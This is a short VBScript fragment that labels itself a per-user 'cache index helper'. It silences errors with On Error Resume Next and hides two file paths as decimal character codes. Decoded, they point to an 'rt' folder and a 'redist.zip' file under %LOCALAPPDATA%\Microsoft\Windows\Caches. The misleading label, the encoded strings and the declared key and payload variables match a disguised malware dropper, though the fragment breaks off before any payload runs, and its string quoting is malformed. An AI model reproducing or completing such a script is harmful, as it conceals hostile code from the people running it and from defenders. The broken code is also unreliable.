' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
    Dim a, i
    a = Split(s, ",")
    Dk = ""
    For i = 0 To UBound(a)
        Dk = Dk & Chr(CInt(a(i)))
    Next
End Function

Dim sh, fo
Set sh = CreateObject("WScript.Shell")
Set fo = CreateObject("Scripting.FileSystemObject")

Dim AP, RT, ST, P1, P2, P3, K1, K2, K3, K4, K5, PY
Dim RK, SV, TS, OR, R1, R2, O1, O2, O3, O4, O5, O6, O7, O8, O9, RV2, RO2, T2
AP = sh.ExpandEnvironmentStrings("%APPDATA%")
RT = "Dk("37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,97,99,104,101,115,92,114,116")"
ST = "Dk("37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,97,99,104,101,115,92,114,101,100,105,115,116,46,122,105,112")"
